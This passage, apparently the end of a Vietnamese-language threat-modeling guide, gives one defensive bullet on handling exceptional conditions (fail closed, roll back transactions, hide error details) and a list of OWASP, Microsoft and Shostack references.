- A10:2025: kiểm soát truy cập luôn fail closed; không nuốt exception; rollback cả giao dịch; không lộ
  chi tiết lỗi (`APP_DEBUG=false`).

**Nguồn**: [Threat Modeling Manifesto](https://www.threatmodelingmanifesto.org/) ·
[OWASP Threat Modeling Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Threat_Modeling_Cheat_Sheet.html) ·
[Microsoft: Threat Modeling Tool threats (STRIDE)](https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats) ·
*Threat Modeling: Designing for Security* (Adam Shostack, Wiley 2014) ·
[OWASP Top 10:2025 A09](https://owasp.org/Top10/2025/A09_2025-Security_Logging_and_Alerting_Failures/) ·
[OWASP Top 10:2025 A10](https://owasp.org/Top10/2025/A10_2025-Mishandling_of_Exceptional_Conditions/) ·
[OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)
